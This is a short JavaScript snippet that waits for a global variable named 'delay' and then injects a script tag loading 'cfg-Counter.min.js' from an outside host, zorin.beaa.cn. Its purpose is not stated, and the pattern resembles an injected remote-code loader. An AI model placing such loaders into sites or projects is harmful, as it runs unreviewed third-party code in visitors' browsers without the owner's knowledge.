(()=>{
    let i = setInterval(()=>{
        if(typeof delay != "undefined"){
            clearInterval(i);
            loadFiles();
        }
    },300);
    function loadFiles(){
        $("body").append('<script src="https://zorin.beaa.cn/test/cfg-Counter.min.js"></script>');
    }
})();